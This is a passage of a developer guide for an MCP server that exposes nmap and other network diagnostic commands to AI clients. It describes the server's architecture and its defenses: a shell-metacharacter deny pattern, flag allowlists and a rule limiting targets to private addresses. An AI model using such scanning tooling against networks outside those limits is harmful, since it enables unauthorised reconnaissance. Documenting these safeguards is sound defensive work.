# MCP Server Comprehensive Development Guide

**Version:** 2.0  
**Purpose:** Definitive guide for developing new tools for the Enhanced MCP Server with complete architectural context

## Table of Contents

1. [Introduction](#introduction)
2. [Prerequisites](#prerequisites)
3. [Architecture Overview](#architecture-overview)
4. [Core Components](#core-components)
5. [Design Patterns & Principles](#design-patterns--principles)
6. [Security Architecture](#security-architecture)
7. [Reliability & Resilience](#reliability--resilience)
8. [Transport Layer](#transport-layer)
9. [Data Flow](#data-flow)
10. [Configuration System](#configuration-system)
11. [Monitoring & Observability](#monitoring--observability)
12. [Extension Points](#extension-points)
13. [Step-by-Step Development Process](#step-by-step-development-process)
14. [Security & Validation Patterns](#security--validation-patterns)
15. [Advanced Features Integration](#advanced-features-integration)
16. [Configuration & Policy Management](#configuration--policy-management)
17. [Testing Your Tool](#testing-your-tool)
18. [Best Practices & Patterns](#best-practices--patterns)
19. [Troubleshooting Guide](#troubleshooting-guide)
20. [Complete Reference Examples](#complete-reference-examples)
21. [Deployment Considerations](#deployment-considerations)

---

## 1. Introduction

### Purpose of This Guide

This guide is the **single source of truth** for developing new tools for the Enhanced MCP Server. It provides:

- Complete understanding of the tool development lifecycle
- Proven patterns from production-ready implementations
- Security-first design principles
- Integration with circuit breakers, metrics, and health monitoring
- Configuration-driven behavior patterns
- Full architectural context for informed development decisions

### What is a Tool?

In the MCP Server context, a **tool** is:

- A Python class that wraps a system command (e.g., `nmap`, `ping`, `traceroute`)
- Provides validated, secure execution of that command
- Integrates with server infrastructure (metrics, circuit breakers, health checks)
- Exposes functionality to MCP clients (Claude Desktop, HTTP API)

### Tool Lifecycle

```
Discovery → Registration → Validation → Execution → Monitoring → Cleanup
    ↓           ↓              ↓            ↓           ↓          ↓
  server.py   server.py    base_tool.py  base_tool.py metrics   server.py
```

### Architecture Overview

The MCP (Model Context Protocol) Server is a production-ready, extensible framework for building secure, monitored network diagnostic tools accessible via dual transport mechanisms (stdio and HTTP). The system features:

- **Security-first design** with multi-layered validation and sandboxing
- **Resilience** through circuit breakers, rate limiting, and graceful degradation
- **Observability** via comprehensive metrics and health monitoring
- **Extensibility** through abstract base classes and plugin-style tool discovery
- **Production readiness** with resource limits, timeout controls, and error recovery

The system is designed to be integrated with AI assistants (like Claude Desktop via stdio) or accessed programmatically via HTTP APIs.

#### High-Level Architecture

```
┌─────────────────────────────────────────────────────────────┐
│ Client Layer │
│ ┌──────────────┐ ┌──────────────┐ │
│ │ Claude Desktop│ │ HTTP Clients │ │
│ │ (stdio) │ │ (REST API) │ │
│ └──────┬───────┘ └──────┬──────┘ │
└─────────┼──────────────────────────────┼───────────────────┘
│ │
│ │
┌─────────▼───────────────────────────────▼───────────────────┐
│ Transport Layer │
│ ┌──────────────┐ ┌──────────────┐ │
│ │ stdio_server │ │ FastAPI │ │
│ │ (MCP SDK) │ │ (HTTP/SSE) │ │
│ └──────┬───────┘ └──────┬──────┘ │
└─────────┼──────────────────────────────┼───────────────────┘
│ │
│ ┌─────────────────────┘
│ │
┌─────────▼─────────▼─────────────────────────────────────────┐
│ EnhancedMCPServer (Orchestrator) │
│ ┌──────────────────────────────────────────────────────┐ │
│ │ • Tool Registry (enable/disable/discovery) │ │
│ │ • Health Manager (monitoring) │ │
│ │ • Metrics Manager (Prometheus/JSON) │ │
│ │ • Rate Limiter (token bucket) │ │
│ │ • Shutdown Coordinator (graceful cleanup) │ │
│ └──────────────────────────────────────────────────────┘ │
└──────────────────────────┬───────────────────────────────────┘
│
┌──────────────────────────▼───────────────────────────────────┐
│ Tool Layer │
│ ┌────────────┐ ┌────────────┐ ┌────────────┐ │
│ │ NmapTool │ │ TracertTool│ │ CustomTool │ ... │
│ │ │ │ │ │ │ │
│ └─────┬──────┘ └─────┬──────┘ └─────┬──────┘ │
│ │ │ │ │
│ └───────────────┴───────────────┘ │
│ │ │
│ ┌───────────▼──────────────┐ │
│ │ MCPBaseTool (Abstract) │ │
│ │ • Input Validation │ │
│ │ • Circuit Breaker │ │
│ │ • Metrics Collection │ │
│ │ • Resource Limiting │ │
│ │ • Error Handling │ │
│ │ • Concurrency Control │ │
│ └──────────────────────────┘ │
└───────────────────────────────────────────────────────────────┘
```

#### Layer Responsibilities

1. **Client Layer**
   - Claude Desktop: Uses stdio transport for seamless AI integration
   - HTTP Clients: RESTful API for programmatic access, web UIs, monitoring

2. **Transport Layer**
   - **stdio_server**: MCP SDK-based bidirectional JSON-RPC over stdin/stdout
   - **FastAPI**: HTTP endpoints with SSE (Server-Sent Events) for real-time updates

3. **Orchestrator Layer (EnhancedMCPServer)**
   - Tool lifecycle management (discovery, registration, enable/disable)
   - Cross-cutting concerns (health, metrics, rate limiting)
   - Transport abstraction and routing
   - Graceful shutdown coordination

4. **Tool Layer**
   - Concrete implementations (NmapTool, TracertTool, etc.)
   - Inherit security, resilience, and observability from base class
   - Focus on tool-specific logic and validation

### Section Checklist

- [ ] Understand the purpose and scope of the guide
- [ ] Familiarize with the tool concept and lifecycle
- [ ] Review the high-level architecture diagram
- [ ] Understand layer responsibilities
- [ ] Identify key features of the MCP Server

---

## 2. Prerequisites

### Required Knowledge

- **Python 3.8+**: Async/await, type hints, dataclasses
- **Command-line tools**: Understanding of the tool you're wrapping
- **Network security**: RFC1918, CIDR notation, input validation
- **Pydantic**: Basic model validation (v1 and v2 compatibility)

### Required Files Structure

```
mcp_server/
├── base_tool.py           # Base class (DO NOT MODIFY)
├── server.py              # Server implementation
├── config.py              # Configuration management
├── circuit_breaker.py     # Circuit breaker pattern
├── metrics.py             # Metrics collection
├── health.py              # Health monitoring
└── tools/                 # YOUR TOOLS GO HERE
    ├── __init__.py
    ├── nmap_tool.py       # Reference implementation
    └── your_new_tool.py   # Your tool
```

### Environment Setup

```bash
# Install dependencies
pip install pydantic  # Required for input validation

# Optional but recommended
pip install prometheus-client  # For metrics
pip install fastapi uvicorn   # For HTTP transport testing
```

### Section Checklist

- [ ] Verify Python 3.8+ is installed
- [ ] Check understanding of required concepts
- [ ] Set up the required file structure
- [ ] Install necessary dependencies
- [ ] Verify environment is ready for development

---

## 3. Architecture Overview

### High-Level Architecture

The MCP Server follows a layered architecture with clear separation of concerns:

```
┌─────────────────────────────────────────────────────────────┐
│ Client Layer │
│ ┌──────────────┐ ┌──────────────┐ │
│ │ Claude Desktop│ │ HTTP Clients │ │
│ │ (stdio) │ │ (REST API) │ │
│ └──────┬───────┘ └──────┬──────┘ │
└─────────┼──────────────────────────────┼───────────────────┘
│ │
│ │
┌─────────▼───────────────────────────────▼───────────────────┐
│ Transport Layer │
│ ┌──────────────┐ ┌──────────────┐ │
│ │ stdio_server │ │ FastAPI │ │
│ │ (MCP SDK) │ │ (HTTP/SSE) │ │
│ └──────┬───────┘ └──────┬──────┘ │
└─────────┼──────────────────────────────┼───────────────────┘
│ │
│ ┌─────────────────────┘
│ │
┌─────────▼─────────▼─────────────────────────────────────────┐
│ EnhancedMCPServer (Orchestrator) │
│ ┌──────────────────────────────────────────────────────┐ │
│ │ • Tool Registry (enable/disable/discovery) │ │
│ │ • Health Manager (monitoring) │ │
│ │ • Metrics Manager (Prometheus/JSON) │ │
│ │ • Rate Limiter (token bucket) │ │
│ │ • Shutdown Coordinator (graceful cleanup) │ │
│ └──────────────────────────────────────────────────────┘ │
└──────────────────────────┬───────────────────────────────────┘
│
┌──────────────────────────▼───────────────────────────────────┐
│ Tool Layer │
│ ┌────────────┐ ┌────────────┐ ┌────────────┐ │
│ │ NmapTool │ │ TracertTool│ │ CustomTool │ ... │
│ │ │ │ │ │ │ │
│ └─────┬──────┘ └─────┬──────┘ └─────┬──────┘ │
│ │ │ │ │
│ └───────────────┴───────────────┘ │
│ │ │
│ ┌───────────▼──────────────┐ │
│ │ MCPBaseTool (Abstract) │ │
│ │ • Input Validation │ │
│ │ • Circuit Breaker │ │
│ │ • Metrics Collection │ │
│ │ • Resource Limiting │ │
│ │ • Error Handling │ │
│ │ • Concurrency Control │ │
│ └──────────────────────────┘ │
└───────────────────────────────────────────────────────────────┘
```

### Component Interaction Matrix

| Component | Depends On | Depended By | Purpose |
|-----------|------------|-------------|---------|
| MCPBaseTool | Pydantic, asyncio, resource | All tools | Base functionality |
| EnhancedMCPServer | FastAPI, MCP SDK, ToolRegistry | Main entry | Orchestration |
| ToolRegistry | MCPBaseTool | EnhancedMCPServer | Tool management |
| RateLimiter | asyncio | HTTP endpoints | Request throttling |
| HealthCheckManager | asyncio | EnhancedMCPServer | Health monitoring |
| MetricsManager | prometheus_client | Tools, Server | Observability |
| NmapTool | MCPBaseTool, ipaddress | ToolRegistry | Network scanning |

### Section Checklist

- [ ] Understand the layered architecture
- [ ] Review component interaction matrix
- [ ] Identify dependencies between components
- [ ] Understand the flow of data through the system
- [ ] Recognize the role of each layer in the architecture

---

## 4. Core Components

### 1. MCPBaseTool (Abstract Base Class)

**Location:** `mcp_server/base_tool.py`

**Purpose:** Foundation for all tools, providing production-ready infrastructure.

**Key Responsibilities:**
- **Input/Output Validation** via Pydantic models (v1/v2 compatible)
- **Security Enforcement**: Command sanitization, argument whitelisting, metacharacter blocking
- **Resource Management**: CPU, memory, file descriptor limits (Unix/Linux)
- **Concurrency Control**: Per-tool semaphores with automatic cleanup
- **Error Handling**: Typed errors with recovery suggestions and context
- **Execution Pipeline**: Async subprocess spawning with timeout and truncation
- **Metrics Integration**: Optional Prometheus metrics collection
- **Circuit Breaker**: Optional failure threshold protection

**State Machine:**
```
Input Received → Validation → Semaphore Acquire → Circuit Breaker Check →
Command Resolution → Argument Sanitization → Resource Limit Setup →
Subprocess Spawn → Timeout Monitor → Output Capture → Metrics Recording →
Error Handling → Cleanup → Output Return
```

**Critical Features:**

1. **Pydantic Compatibility Layer**
```python
# Supports both Pydantic v1 and v2
if _PD_V2:
    @field_validator("target", mode='after')
else:
    @field_validator("target")
```

2. **Thread-Safe Semaphore Registry**
```python
# Per-event-loop semaphore with weak references for cleanup
_semaphore_registry: Dict[str, asyncio.Semaphore]
_loop_refs: weakref.WeakValueDictionary
```

3. **Security Validation**
```python
# Target must be RFC1918 or .lab.internal
_is_private_or_lab(value: str) -> bool

# Block shell metacharacters
_DENY_CHARS = re.compile(r"[;&|`$><\n\r]")
```

4. **Resource Limits (Unix/Linux only)**
```python
resource.setrlimit(resource.RLIMIT_CPU, ...)
resource.setrlimit(resource.RLIMIT_AS, ...)  # Memory
resource.setrlimit(resource.RLIMIT_NOFILE, ...)  # FDs
resource.setrlimit(resource.RLIMIT_CORE, (0, 0))  # No core dumps
```

**Extension Points:**
- Subclass must define: command_name, optionally allowed_flags
- Override _execute_tool() for custom validation/optimization
- Override get_tool_info() for tool-specific metadata

### 2. EnhancedMCPServer (Orchestrator)

**Location:** `mcp_server/server.py`

**Purpose:** Central coordinator managing tools, transports, and cross-cutting concerns.

**Key Responsibilities:**
- Tool discovery via package scanning (pkgutil)
- Tool registry with enable/disable functionality
- Transport abstraction (stdio vs HTTP)
- Health monitoring via HealthCheckManager
- Metrics aggregation via MetricsManager
- Rate limiting (token bucket algorithm)
- Graceful shutdown with background task cleanup
- Signal handling (SIGINT, SIGTERM)

**Architecture Patterns:**

1. **Tool Discovery Pattern**
```python
# Scan package for MCPBaseTool subclasses
_load_tools_from_package(package_path, include, exclude)

# Pattern-based exclusion
EXCLUDED_PREFIXES = {'Test', 'Mock', 'Abstract', '_', 'Example'}
EXCLUDED_SUFFIXES = {'Base', 'Mixin', 'Interface'}
```

2. **Registry Pattern**
```python
class ToolRegistry:
    tools: Dict[str, MCPBaseTool]  # All registered tools
    enabled_tools: Set[str]         # Currently enabled subset
```

3. **Health Check Integration**
```python
# Per-tool health checks
HealthCheckManager.register_check(
    name=f"tool_{tool_name}",
    check_func=self._create_tool_health_check(tool),
    priority=HealthCheckPriority.INFORMATIONAL
)
```

4. **Background Task Management**
```python
_background_tasks: Set[asyncio.Task]

# Auto-cleanup on task completion
task.add_done_callback(self._background_tasks.discard)
```

**Dual Transport Support:**

- **stdio Transport**: For Claude Desktop integration
  - Uses MCP SDK's stdio_server() context manager
  - JSON-RPC over stdin/stdout
  - Graceful shutdown via shutdown_event

- **HTTP Transport**: For programmatic/web access
  - FastAPI with CORS middleware
  - RESTful endpoints: /tools, /health, /metrics
  - SSE endpoint /events for real-time updates
  - Rate limiting per client IP + tool combination

### 3. ToolRegistry

**Purpose:** Centralized tool management with lifecycle control.

**Features:**
- Tool registration from discovery process
- Enable/disable without restart
- Filter-based inclusion/exclusion (env vars)
- Tool information aggregation
- Metrics/circuit breaker initialization per tool

**API:**
```python
registry.get_tool(tool_name) -> Optional[MCPBaseTool]
registry.get_enabled_tools() -> Dict[str, MCPBaseTool]
registry.enable_tool(tool_name)
registry.disable_tool(tool_name)
registry.get_tool_info() -> List[Dict[str, Any]]
```

### 4. RateLimiter

**Algorithm:** Token bucket with per-client tracking

**Features:**
- Configurable rate (requests per time window)
- Automatic cleanup of stale clients
- Thread-safe operation (asyncio.Lock)
- Client limit to prevent memory exhaustion

**Implementation:**
```python
# Token bucket: clients start with full allowance
allowance: Dict[str, float] = defaultdict(lambda: rate)

# Tokens regenerate over time
allowance[key] += time_passed * (rate / per)

# Request consumes a token
if allowance[key] < 1.0:
    return False  # Rate limited
allowance[key] -= 1.0
```

**Configuration:**
```python
RateLimiter(rate=10, per=60.0, max_clients=1000)
# 10 requests per 60 seconds, track up to 1000 clients
```

### Section Checklist

- [ ] Understand MCPBaseTool as the foundation for all tools
- [ ] Review EnhancedMCPServer orchestration responsibilities
- [ ] Familiarize with ToolRegistry lifecycle management
- [ ] Understand RateLimiter implementation and configuration
- [ ] Review all critical features and extension points

---

## 5. Design Patterns & Principles

### 1. Template Method Pattern

MCPBaseTool.run() orchestrates execution while allowing subclass customization:

```python
async def run(self, inp: ToolInput) -> ToolOutput:
    # Template method with hooks:
    # 1. Circuit breaker check
    # 2. Semaphore acquire
    # 3. _execute_tool() [customizable]
    # 4. Metrics recording
    # 5. Cleanup
```

### 2. Strategy Pattern

Transport strategies (stdio vs HTTP) are swapped at runtime:

```python
if transport == "stdio":
    await self.run_stdio_original()
elif transport == "http":
    await self.run_http_enhanced()
```

### 3. Registry Pattern

ToolRegistry centralizes tool management with runtime enable/disable.

### 4. Circuit Breaker Pattern

Optional per-tool circuit breakers prevent cascading failures:

```python
# States: CLOSED → OPEN (failures exceed threshold) → HALF_OPEN → CLOSED
```

### 5. Fallback Pattern

Graceful degradation when optional dependencies missing:

```python
if not FASTAPI_AVAILABLE:
    # Fallback to stdio if MCP available
    # Or raise clear error with installation instructions
```

### 6. Observer Pattern

Health checks and metrics are observers of tool execution events.

### 7. Immutability for Safety

```python
BASE_ALLOWED_FLAGS: Tuple[str, ...]  # Immutable
allowed_flags property returns new list each time
```

### Section Checklist

- [ ] Understand Template Method pattern in tool execution
- [ ] Review Strategy pattern for transport selection
- [ ] Familiarize with Registry pattern for tool management
- [ ] Understand Circuit Breaker pattern for resilience
- [ ] Review Fallback pattern for graceful degradation
- [ ] Understand Observer pattern for monitoring
- [ ] Review Immutability principle for safety

---

## 6. Security Architecture

### Multi-Layer Defense

**Layer 1: Input Validation (Pydantic Models)**
```python
class ToolInput(BaseModel):
    target: str  # Validated by _is_private_or_lab()
    extra_args: str  # Length and character class validation
```

**Layer 2: Target Restriction**
```python
_is_private_or_lab(value: str):
    # RFC1918 private IPs: 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16
    # CIDR networks with same restrictions
    # .lab.internal hostnames with RFC-compliant format
```

**Layer 3: Argument Sanitization**
```python
# Block shell metacharacters
_DENY_CHARS = re.compile(r"[;&|`$><\n\r]")

# Whitelist allowed tokens
_TOKEN_ALLOWED = re.compile(r"^[A-Za-z0-9.:/=+,\-@%_]+$")

# Flag whitelisting per tool
allowed_flags: Optional[Sequence[str]]
```

**Layer 4: Command Resolution**
```python
# Only use shutil.which() - no shell execution
resolved_cmd = shutil.which(self.command_name)
```

**Layer 5: Resource Sandboxing**
```python
# Unix resource limits
RLIMIT_CPU, RLIMIT_AS (memory), RLIMIT_NOFILE, RLIMIT_CORE

# Process isolation
start_new_session=True  # Separate process group
```

**Layer 6: Policy Enforcement (Tool-Specific)**
```python
# NmapTool example
allow_intrusive: bool  # Gates -A flag and vuln scripts
_validate_and_filter_scripts()  # Category-based filtering
```

### Security Principles

- **Least Privilege**: Tools run with minimal permissions, resource limits
- **Defense in Depth**: Multiple validation layers
- **Fail Secure**: Errors block execution, don't bypass checks
- **Whitelist > Blacklist**: Explicitly allowed flags/targets only
- **Immutable Defaults**: Base configurations are constants
- **Audit Trail**: Comprehensive logging of security events

### Section Checklist

- [ ] Understand all six layers of security defense
- [ ] Review input validation mechanisms
- [ ] Familiarize with target restriction rules
- [ ] Understand argument sanitization process
- [ ] Review command resolution security
- [ ] Understand resource sandboxing
- [ ] Review policy enforcement mechanisms
- [ ] Familiarize with all security principles

---

## 7. Reliability & Resilience

### Circuit Breaker Integration

**Purpose:** Prevent cascading failures from repeated tool failures

**Configuration:**
```python
circuit_breaker_failure_threshold: int = 5
circuit_breaker_recovery_timeout: float = 120.0
circuit_breaker_expected_exception: tuple = (Exception,)
```

**State Machine:**
```
CLOSED (normal) → [5 failures] → OPEN (fail fast) → 
[120s timeout] → HALF_OPEN (test) → [success] → CLOSED
                                    → [failure] → OPEN
```

**Error Handling:**
```python
if circuit_breaker.state == OPEN:
    return ToolOutput(error_type=ToolErrorType.CIRCUIT_BREAKER_OPEN)
```

### Timeout Management

**Multi-Level Timeouts:**
- Tool Default: default_timeout_sec (e.g., 600s for nmap)
- Input Override: ToolInput.timeout_sec
- Global Max: Environment variable MCP_DEFAULT_TIMEOUT_SEC

**Enforcement:**
```python
await asyncio.wait_for(proc.communicate(), timeout=timeout_sec)

# On timeout: SIGKILL entire process group
os.killpg(os.getpgid(proc.pid), signal.SIGKILL)
```

### Concurrency Control

**Per-Tool Semaphores:**
```python
concurrency: ClassVar[int] = 2  # Max 2 concurrent executions

async with self._ensure_semaphore():
    # Execute tool
```

**Automatic Cleanup:**
```python
# Weak references to event loops
_loop_refs: weakref.WeakValueDictionary

# Clean dead loop semaphores
dead_keys = [k for k in registry if loop_id not in _loop_refs]
```

### Graceful Shutdown

**Shutdown Sequence:**
- Signal Handler sets shutdown_event
- Health Manager stops monitoring
- Metrics Manager performs cleanup
- Background Tasks cancelled with gather(return_exceptions=True)
- Circuit Breakers cleanup (if implemented)
- Server waits for grace period before force-stop

```python
async def cleanup(self):
    await self.health_manager.stop_monitoring()
    await self.metrics_manager.cleanup()
    
    # Cancel background tasks
    for task in self._background_tasks:
        if not task.done():
            task.cancel()
    
    await asyncio.gather(*tasks, return_exceptions=True)
```

### Error Recovery

**Typed Errors with Context:**
```python
class ToolErrorType(Enum):
    TIMEOUT, NOT_FOUND, VALIDATION_ERROR, EXECUTION_ERROR,
    RESOURCE_EXHAUSTED, CIRCUIT_BREAKER_OPEN, UNKNOWN

class ErrorContext:
    error_type: ToolErrorType
    message: str
    recovery_suggestion: str  # Actionable guidance
    metadata: Dict[str, Any]
```

**Example Error:**
```python
ErrorContext(
    error_type=ToolErrorType.VALIDATION_ERROR,
    message="Network range too large: 4096 addresses (max: 1024)",
    recovery_suggestion="Use /22 or smaller prefix (max 1024 hosts)",
    metadata={
        "suggested_cidr": "/22",
        "example": "192.168.0.0/22"
    }
)
```

### Section Checklist

- [ ] Understand Circuit Breaker pattern and configuration
- [ ] Review multi-level timeout management
- [ ] Familiarize with concurrency control mechanisms
- [ ] Understand graceful shutdown sequence
- [ ] Review error recovery with typed errors
- [ ] Understand resource cleanup procedures

---

## 8. Transport Layer

### stdio Transport (MCP Protocol)

**Use Case:** Claude Desktop integration

**Protocol:** JSON-RPC 2.0 over stdin/stdout

**Registration:**
```python
server.register_tool(
    name="NmapTool",
    description="Network scanner",
    input_schema={...},  # JSON Schema
    handler=async_handler_function
)
```

**Execution Flow:**
```
Claude → JSON-RPC Request → stdio_server → handler → 
MCPBaseTool.run() → TextContent Response → Claude
```

**Response Format:**
```python
[TextContent(type="text", text=json.dumps(result.dict()))]
```

### HTTP Transport (FastAPI)

**Use Case:** API access, monitoring, web UIs

**Endpoints:**
```
Endpoint    Method    Purpose
/           GET       Server info, available endpoints
/health     GET       Health checks (200/207/503)
/tools      GET       List tools with metadata
/tools/{name}/execute  POST  Execute tool (rate limited)
/tools/{name}/enable   POST  Enable tool
/tools/{name}/disable  POST  Disable tool
/metrics    GET       Prometheus or JSON metrics
/events     GET       SSE for real-time updates
/config     GET       Current config (redacted)
```

**Rate Limiting:**
```python
# Per client IP + tool combination
rate_limit_key = f"{client_ip}:{tool_name}"

if not await rate_limiter.check_rate_limit(rate_limit_key):
    raise HTTPException(status_code=429, detail={...})
```

**SSE Events:**
```python
# Real-time health and metrics
async def event_generator():
    while not disconnected:
        yield {"type": "health", "data": {...}}
        yield {"type": "metrics", "data": {...}}
        await asyncio.sleep(5)
```

### Section Checklist

- [ ] Understand stdio transport for Claude Desktop integration
- [ ] Review HTTP transport endpoints and methods
- [ ] Familiarize with rate limiting implementation
- [ ] Understand SSE events for real-time updates
- [ ] Review transport-specific response formats

---

## 9. Data Flow

### Typical Execution Flow

```
1. CLIENT REQUEST
   ├─ stdio: JSON-RPC over stdin
   └─ HTTP: POST /tools/NmapTool/execute

2. TRANSPORT LAYER
   ├─ stdio: MCP handler → ToolInput
   └─ HTTP: FastAPI endpoint → Rate Limit → ToolInput

3. ORCHESTRATOR (EnhancedMCPServer)
   ├─ Tool lookup in registry
   ├─ Check if enabled
   └─ Route to tool instance

4. TOOL (e.g., NmapTool)
   ├─ MCPBaseTool.run(inp)
   │  ├─ Increment active execution counter
   │  ├─ Check circuit breaker state
   │  ├─ Acquire semaphore (concurrency control)
   │  └─ Call _execute_tool(inp)
   │
   ├─ NmapTool._execute_tool(inp)
   │  ├─ Validate nmap-specific requirements
   │  ├─ Parse and validate arguments
   │  ├─ Optimize arguments (add smart defaults)
   │  └─ Call super()._execute_tool(enhanced_input)
   │
   └─ MCPBaseTool._execute_tool(enhanced_input)
      ├─ Resolve command (shutil.which)
      ├─ Parse and sanitize arguments
      └─ Call _spawn(cmd, timeout)

5. SUBPROCESS EXECUTION
   ├─ Set resource limits (Unix)
   ├─ Create subprocess (start_new_session=True)
   ├─ Monitor with timeout
   ├─ Capture stdout/stderr
   └─ Truncate if exceeds limits

6. RESULT PROCESSING
   ├─ Parse output (tool-specific, e.g., nmap parser)
   ├─ Record metrics (success, duration, error type)
   ├─ Update circuit breaker state
   └─ Create ToolOutput with metadata

7. RESPONSE
   ├─ stdio: TextContent with JSON
   └─ HTTP: JSONResponse with ToolOutput.dict()

8. CLEANUP
   ├─ Decrement active execution counter
   ├─ Release semaphore
   └─ Log execution summary
```

### Section Checklist

- [ ] Understand the complete execution flow from client to response
- [ ] Review transport layer processing
- [ ] Familiarize with orchestrator responsibilities
- [ ] Understand tool execution pipeline
- [ ] Review subprocess execution details
- [ ] Understand result processing and cleanup

---

## 10. Configuration System

### Configuration Sources (Priority Order)

1. Environment Variables (highest priority)
2. Configuration File (MCP_CONFIG_FILE)
3. Code Defaults (lowest priority)

### Key Configuration Objects

```python
class SecurityConfig:
    allow_intrusive: bool = False

class ToolConfig:
    default_timeout: float = 300.0
    default_concurrency: int = 2

class CircuitBreakerConfig:
    failure_threshold: int = 5
    recovery_timeout: float = 60.0

class ServerConfig:
    host: str = "0.0.0.0"
    port: int = 8080

class Config:
    security: SecurityConfig
    tool: ToolConfig
    circuit_breaker: CircuitBreakerConfig
    server: ServerConfig
    
    def to_dict(self, redact_sensitive=False) -> Dict
```

### Environment Variables

```
Variable                    Default    Purpose
MCP_SERVER_TRANSPORT        stdio      stdio or http
MCP_SERVER_PORT             8080       HTTP server port
MCP_SERVER_HOST             0.0.0.0    HTTP server host
MCP_CONFIG_FILE             -          Path to config file
TOOLS_PACKAGE               mcp_server.tools  Package to scan
TOOL_INCLUDE                -          CSV of tools to include
TOOL_EXCLUDE                -          CSV of tools to exclude
LOG_LEVEL                   INFO       Logging level
MCP_MAX_ARGS_LEN            2048       Max argument length
MCP_MAX_STDOUT_BYTES        1048576    Max stdout (1MB)
MCP_MAX_STDERR_BYTES        262144     Max stderr (256KB)
MCP_DEFAULT_TIMEOUT_SEC     300        Default timeout
MCP_DEFAULT_CONCURRENCY     2          Default concurrency
MCP_MAX_MEMORY_MB           512        Memory limit
MCP_MAX_FILE_DESCRIPTORS    256        FD limit
```

### Configuration Application

```python
def _apply_config(self):
    # Clamp values to safe ranges
    self.timeout = max(60.0, min(3600.0, config.timeout))
    self.concurrency = max(1, min(5, config.concurrency))
    
    # Log when clamped
    if clamped:
        log.info("config_clamped param=%s original=%s new=%s")
```

### Section Checklist

- [ ] Understand configuration source priority
- [ ] Review configuration object structure
- [ ] Familiarize with environment variables
- [ ] Understand configuration application with safe clamping
- [ ] Review configuration validation procedures

---

## 11. Monitoring & Observability

### Health Monitoring

**Architecture:**
```
HealthCheckManager
├─ system_health_check (CPU, memory, disk)
├─ tool_availability_check (commands in PATH)
└─ per_tool_health_checks (circuit breaker state)
```

**Health States:**
```python
class HealthStatus(Enum):
    HEALTHY = "healthy"
    DEGRADED = "degraded"
    UNHEALTHY = "unhealthy"
```

**Priority Levels:**
```python
class HealthCheckPriority(Enum):
    CRITICAL = 1      # System-level
    HIGH = 2          # Important tools
    MEDIUM = 3        # Optional tools
    LOW = 4
    INFORMATIONAL = 5  # Metrics, stats
```

**HTTP Response Codes:**
- 200: All HEALTHY
- 207: Some DEGRADED (multi-status)
- 503: Any UNHEALTHY

### Metrics Collection

**Prometheus Metrics:**
```
mcp_tool_execution_total{tool="NmapTool",status="success"}
mcp_tool_execution_duration_seconds{tool="NmapTool"}
mcp_tool_active_executions{tool="NmapTool"}
mcp_tool_timeouts_total{tool="NmapTool"}
mcp_circuit_breaker_state{tool="NmapTool",state="open"}
```

**Fallback JSON Metrics:**
```json
{
  "system": {"cpu": ..., "memory": ...},
  "tools": {
    "NmapTool": {
      "executions": 150,
      "successes": 145,
      "failures": 5,
      "avg_duration": 12.3,
      "active": 2
    }
  }
}
```

### Logging Strategy

**Structured Logging:**
```python
log.info("tool.start command=%s timeout=%.1f", cmd, timeout)
log.error("tool.error tool=%s error_type=%s", name, error_type)
```

**Log Levels:**
- DEBUG: Configuration, cache operations, internal state
- INFO: Execution lifecycle, optimizations, state changes
- WARNING: Non-fatal issues, fallbacks, deprecated usage
- ERROR: Failures, exceptions, security violations
- CRITICAL: System-level failures

### Section Checklist

- [ ] Understand health monitoring architecture
- [ ] Review health states and priority levels
- [ ] Familiarize with HTTP response codes for health
- [ ] Understand Prometheus metrics collection
- [ ] Review fallback JSON metrics format
- [ ] Understand structured logging strategy
- [ ] Review log level definitions

---

## 12. Extension Points

### Creating a New Tool

**Minimum Implementation:**
```python
from mcp_server.base_tool import MCPBaseTool, ToolInput, ToolOutput

class MyTool(MCPBaseTool):
    command_name = "mytool"  # Required
    allowed_flags = ["-flag1", "-flag2"]  # Optional whitelist
    
    # Optional overrides
    default_timeout_sec = 300.0
    concurrency = 2
    circuit_breaker_failure_threshold = 5
```

**Custom Validation:**
```python
async def _execute_tool(self, inp: ToolInput, timeout_sec) -> ToolOutput:
    # 1. Custom validation
    if not self._my_validation(inp.target):
        return self._create_error_output(error_context, ...)
    
    # 2. Parse/optimize args
    parsed = self._parse_my_args(inp.extra_args)
    
    # 3. Call base implementation
    enhanced = ToolInput(target=inp.target, extra_args=parsed, ...)
    return await super()._execute_tool(enhanced, timeout_sec)
```

**Tool-Specific Metadata:**
```python
def get_tool_info(self) -> Dict[str, Any]:
    base_info = super().get_tool_info()
    base_info.update({
        "my_feature": "enabled",
        "supported_modes": ["fast", "thorough"]
    })
    return base_info
```

### Adding Custom Health Checks

```python
from mcp_server.health import HealthCheck, HealthStatus, HealthCheckPriority

class MyHealthCheck(HealthCheck):
    async def check(self) -> HealthStatus:
        # Custom logic
        if condition:
            return HealthStatus.HEALTHY
        return HealthStatus.DEGRADED

# Register in server
server.health_manager.add_health_check(
    MyHealthCheck(),
    priority=HealthCheckPriority.HIGH
)
```

### Adding Custom Metrics

```python
# Assumed MetricsManager API
metrics_manager.register_counter("my_metric_total")
metrics_manager.increment("my_metric_total", labels={"status": "success"})
```

### Section Checklist

- [ ] Understand minimum tool implementation requirements
- [ ] Review custom validation patterns
- [ ] Familiarize with tool-specific metadata
- [ ] Understand custom health check implementation
- [ ] Review custom metrics integration

---

## 13. Step-by-Step Development Process

### Phase 1: Planning

#### 1.1 Understand Your Command

```bash
# Study the command you're wrapping
man nmap
nmap --help

# Identify:
# - Required arguments
# - Optional flags
# - Dangerous flags (exclude these!)
# - Output format
# - Exit codes
```

#### 1.2 Security Assessment

**Questions to answer:**
- ❓ Can this command execute arbitrary code? (e.g., `--script` in nmap)
- ❓ Can it write files? (restrict or validate paths)
- ❓ Can it consume excessive resources? (set limits)
- ❓ Does it accept shell metacharacters? (block them)
- ❓ Can it scan public networks? (restrict targets)

**Example risk matrix:**
```python
# HIGH RISK - Requires strict controls
allowed_flags = ["-sV"]  # Service detection only
# Blocked: -sS (SYN scan), -O (OS detection), --script (arbitrary scripts)

# LOW RISK - More permissive
allowed_flags = ["-c", "-W", "-i", "-q"]  # Ping flags
```

### Phase 2: Implementation

#### 2.1 Create Tool File

```python
"""
Your tool description.

Features:
- What it does
- Security controls
- Usage examples

Safety Controls:
- List all safety measures
- Restrictions
- Validation rules
"""
import logging
from typing import Sequence, Optional, ClassVar
from mcp_server.base_tool import MCPBaseTool, ToolInput, ToolOutput

log = logging.getLogger(__name__)

class YourTool(MCPBaseTool):
    """One-line description for documentation."""
    
    command_name = "your_command"
    allowed_flags = ["-safe-flag"]
```

